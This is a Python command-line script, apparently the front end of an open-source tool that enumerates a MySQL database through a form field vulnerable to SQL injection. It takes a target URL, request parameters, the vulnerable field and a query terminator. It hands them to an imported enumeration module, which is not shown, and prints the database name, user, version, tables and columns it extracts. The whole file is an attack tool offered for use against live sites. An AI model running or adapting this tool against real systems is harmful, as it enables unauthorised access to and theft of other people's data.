#!/usr/bin/python
# 
# Enumerate details of a MySQL database through a form field that is vulnerable to SQL injection 
# Copyright (C) 2019
# Salman Raza <raza.salman@gmail.com>
#
# GNU General Public License v3.0
#
# This program is free software: you can redistribute it and/or modify it under the terms
# of the GNU General Public License as published by the Free Software Foundation, either version 3
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
# even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General
# Public License for more details.
#
# You should have received a copy of the GNU General Public License along with this program.
# If not, see <https://www.gnu.org/licenses/>

import argparse
from prettytable import PrettyTable
from MySQLEnum import *


def show_banner():
    
    print(
    '''
     ______  _     _  _    _____  _       _______ ______  _     _ ______  
    |  ___ \| |   | || |  / ___ \| |     (_______)  ___ \| |   | |  ___ \ 
    | | _ | | |___| | \ \| |   | | |      _____  | |   | | |   | | | _ | |
    | || || |\_____/   \ \ |   |_| |     |  ___) | |   | | |   | | || || |
    | || || |  ___ _____) ) \____| |_____| |_____| |   | | |___| | || || |
    |_||_||_| (___|______/ \_____)_______)_______)_|   |_|\______|_||_||_|
                                                                    {}
    '''.format(clr.bgred(clr.yellow(clr.white("@pyrod"))))
    
    )

def construct_data(post_args, vuln_field):
    '''Construct the data that will be sent as a part of the GET or POST request to the target. One of these fields is specified as being vulnerable in the command line arguments, on which the SQL injection will be done.'''
    retval = {}
    
    for i in post_args.split(","):
        
        param = i.split(":")
        retval[param[0]] = param[1]
    
    if vuln_field not in retval:
        
        print(clr.red("\n[!]") + "Vulnerable field '{}' not found in provided post arguments... exiting\n".format(vuln_field))
        exit(0)
    
    return retval
    
def print_db_info(db, format=None):
    '''Print the DB information to the screen in a tabular format.'''
    
    if format == "table":
    
        info = PrettyTable(["{}: {}".format(clr.red("DB Name"),clr.white(db['info']['dbname'])),
                            "{}: {}".format(clr.red("DB User"),clr.white(db['info']['username'])),
                            "{}: {}".format(clr.red("DB Version"),clr.white(db['info']['version'])),
                            "{}: {}".format(clr.red("Tables"),clr.white(db['info']['table_count']))
                            ])
                            
        print(info)
        
    else:
        print(("\n{db}: {db_info}\t{user}: {user_info}\t{version}: {version_info}\t{tables}: {tables_info}\n") \
        .format(db=clr.red("DB Name"), db_info=clr.white(db['info']['dbname']),
        user=clr.red("DB User"), user_info=clr.white(db['info']['username']),
        version=clr.red("DB Version"), version_info=clr.white(db['info']['version']),
        tables=clr.red("Tables"), tables_info=clr.white(db['info']['table_count'])))

def print_table_info(DB, format=None):
    '''Print the table information to the screen in a tabular format.'''
    
    if format == "table":
        
        
        no = 0
        for table,content in DB['tables'].items():
            
            no = no+1
                            
            head = PrettyTable(["{}".format(clr.white(str(no))),
                            "{}: {}".format(clr.red("Table Name"),clr.white(table)),
                            "{}: {}".format(clr.red("Columns"),clr.white(content['col_count'])),
                            "{}: {}".format(clr.red("Rows"),clr.white(content['row_count']))
                            ])
            
            body = PrettyTable(["No.","Columns"])
            
            body.align = "l"
            
            i = 0
            
            for col in content['cols']:
            
                i = i+1
                
                body.add_row([clr.red(str(i)),clr.yellow(col)])
        
        
            print(head)
            
            print(body)
    
    
    else:

        for table,content in DB['tables'].items():
            
            print("\n{table}: {table_info}\t{column}: {column_info}\t{rows}: {rows_info}" \
            .format(table=clr.red("Table Name"),table_info=clr.white(table),
            column=clr.red("Columns"),column_info=clr.white(content['col_count']),
            rows=clr.red("Rows"),rows_info=clr.white(content['row_count'])))
            
            print(clr.yellow("COLUMNS:"))
            
            for col in content['cols']:
            
                print(clr.yellow("\t{}".format(col)))
        
        
        
         

def start(url=None,
            data=None,
            vuln_field=None,
            table_limit=None,
            debug=None,
            terminator=None,
            request_type=None):
    
    
    data = construct_data(data, vuln_field)
    
    print(clr.red("\nENUMERATING DATABASE ...\n"))
   
    enum = MYSQLENUM(target_url=url,
                        data=data,
                        vuln_field=vuln_field,
                        table_limit=table_limit,
                        debug=debug,
                        request_type=request_type,
                        terminator=terminator
                        )
                        
    print_db_info(enum.DB, format="table")
       
    print(clr.yellow("\nENUMERATED TABLES FOR: {}\n".format(clr.red(enum.DB['url']))))
    
    print_table_info(enum.DB, format="table")
    
    
    

if __name__ == '__main__':

    show_banner()

    parser = argparse.ArgumentParser()
    parser.add_argument("-debug","--debug", help="Show debug messages : Use d=DEBUG, w=WARNING, i=INFO, e=ERROR, c=CRITICAL")
    parser.add_argument("-u","--url", help="Full path to the vulnerable URL", required=True)
    parser.add_argument("-r","--request_type", help="Request type get=GET, post=POST", required=True)
    parser.add_argument("-d","--data", help="Data parameters in the format 'parameter1:value1,parameter2:value2...'", required=True)
    parser.add_argument("-v","--vuln_field", help="Vulnerable parameter from the data provided in the -d switch", required=True)
    parser.add_argument("-limit","--table_limit", help="Limit the number of tables to be enumerated")
    parser.add_argument("-t","--terminator", help="The string to be appended at the end of the injected query, that will comment out rest of the part after the injected query", required=True)
    args = parser.parse_args()
    
    
    if args.request_type not in ['get','post']:
        
        parser.error("Invalid request type: Use get=GET, post=POST")
        
    if (args.debug is not None) and (args.debug not in ['w','i','d','e','c']):
        
        parser.error("Invalid debug level setting: Use d=DEBUG, w=WARNING, i=INFO, e=ERROR, c=CRITICAL")
        
        
    
    start(url=args.url,
        data=args.data,
        vuln_field=args.vuln_field,
        table_limit=args.table_limit,
        debug=args.debug,
        terminator=args.terminator,
        request_type=args.request_type)

